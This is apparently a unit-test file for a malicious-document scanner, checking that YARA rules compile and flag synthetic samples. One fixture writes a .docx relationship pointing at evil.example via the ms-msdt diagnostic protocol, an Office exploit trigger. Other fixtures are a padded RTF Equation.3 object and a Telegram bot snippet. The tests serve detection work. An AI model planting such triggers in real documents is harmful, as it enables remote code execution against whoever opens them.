from __future__ import annotations

import sys
import tempfile
import unittest
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from moda.core.engine import AnalyzerEngine


class YaraRuleTests(unittest.TestCase):
    def test_official_rules_compile_when_yara_is_available(self) -> None:
        try:
            import yara
        except ImportError:
            self.skipTest("yara-python is not installed")

        rules_dir = Path(__file__).resolve().parents[1] / "rules" / "official"
        filepaths = {path.stem: str(path) for path in rules_dir.glob("*.yar")}

        compiled = yara.compile(filepaths=filepaths)

        self.assertIsNotNone(compiled)

    def test_ooxml_exploit_protocol_rule_matches(self) -> None:
        try:
            import yara
        except ImportError:
            self.skipTest("yara-python is not installed")

        rules_dir = Path(__file__).resolve().parents[1] / "rules" / "official"
        compiled = yara.compile(str(rules_dir / "maldoc_ooxml.yar"))
        with tempfile.TemporaryDirectory() as temp_dir:
            sample = Path(temp_dir) / "exploit.docx"
            with zipfile.ZipFile(sample, "w") as archive:
                archive.writestr(
                    "[Content_Types].xml",
                    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
                )
                archive.writestr(
                    "word/document.xml",
                    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/>',
                )
                archive.writestr(
                    "word/_rels/document.xml.rels",
                    (
                        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                        '<Relationship Id="rId1" Type="oleObject" '
                        'Target="mhtml:http://evil.example/a.html!x-usc:ms-msdt:/id PCWDiagnostic" '
                        'TargetMode="External"/>'
                        "</Relationships>"
                    ),
                )

            matches = {match.rule for match in compiled.match(str(sample))}

        self.assertIn("ooxml_office_exploit_protocols", matches)

    def test_rtf_malver_objects_rule_matches(self) -> None:
        try:
            import yara
        except ImportError:
            self.skipTest("yara-python is not installed")

        rules_dir = Path(__file__).resolve().parents[1] / "rules" / "official"
        compiled = yara.compile(str(rules_dir / "maldoc_rtf.yar"))
        sample = (
            "{\\rtf1{\\object\\objemb\\objclass Equation.3{\\objdata "
            + "d0cf11e0a1b11ae1"
            + "41" * 500
            + "}}}"
        ).encode()

        matches = {match.rule for match in compiled.match(data=sample)}

        self.assertIn("SUSP_INDICATOR_RTF_MalVer_Objects", matches)

    def test_telebot_framework_rule_matches(self) -> None:
        try:
            import yara
        except ImportError:
            self.skipTest("yara-python is not installed")

        rules_dir = Path(__file__).resolve().parents[1] / "rules" / "official"
        compiled = yara.compile(str(rules_dir / "maldoc_macros.yar"))
        sample = (
            b'import telebot\n'
            b'bot = telebot.TeleBot("123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghi")\n'
            b'bot.sendMessage(1234, "ready")\n'
        )

        matches = {match.rule for match in compiled.match(data=sample)}

        self.assertIn("telebot_framework", matches)

    def test_scanner_loads_custom_rules(self) -> None:
        custom_dir = Path(__file__).resolve().parents[1] / "rules" / "custom"
        custom_dir.mkdir(exist_ok=True)
        custom_rule = custom_dir / "unit_custom_rule.yar"
        custom_rule.write_text(
            """
rule unit_custom_rule_for_tests
{
    strings:
        $marker = "UNIT_CUSTOM_YARA_MARKER"
    condition:
        $marker
}
""".strip(),
            encoding="utf-8",
        )
        self.addCleanup(custom_rule.unlink, missing_ok=True)

        with tempfile.TemporaryDirectory() as temp_dir:
            sample = Path(temp_dir) / "marker.bin"
            sample.write_bytes(b"UNIT_CUSTOM_YARA_MARKER")

            result = AnalyzerEngine(skip_yara=False).analyze_file(sample)

        rules = {match.rule_name for match in result.yara_matches}
        self.assertIn("unit_custom_rule_for_tests", rules)
        self.assertTrue(
            any(finding.title == "YARA Rule Match: unit_custom_rule_for_tests" for finding in result.findings)
        )

    def test_scanner_loads_external_rules_and_skips_bad_files(self) -> None:
        external_dir = Path(__file__).resolve().parents[1] / "rules" / "external" / "unit"
        external_dir.mkdir(parents=True, exist_ok=True)
        good_rule = external_dir / "unit_external_good.yar"
        bad_rule = external_dir / "unit_external_bad.yar"
        good_rule.write_text(
            """
rule unit_external_rule_for_tests
{
    strings:
        $marker = "UNIT_EXTERNAL_YARA_MARKER"
    condition:
        $marker
}
""".strip(),
            encoding="utf-8",
        )
        bad_rule.write_text("rule unit_external_bad { strings: $a = \"x\" condition: $missing }", encoding="utf-8")
        self.addCleanup(good_rule.unlink, missing_ok=True)
        self.addCleanup(bad_rule.unlink, missing_ok=True)

        with tempfile.TemporaryDirectory() as temp_dir:
            sample = Path(temp_dir) / "marker.bin"
            sample.write_bytes(b"UNIT_EXTERNAL_YARA_MARKER")

            result = AnalyzerEngine(skip_yara=False).analyze_file(sample)

        rules = {match.rule_name for match in result.yara_matches}
        self.assertIn("unit_external_rule_for_tests", rules)
        self.assertIn("yara_compile_errors", result.extra)
        self.assertTrue(
            any(finding.title == "YARA Rule Match: unit_external_rule_for_tests" for finding in result.findings)
        )


if __name__ == "__main__":
    unittest.main()
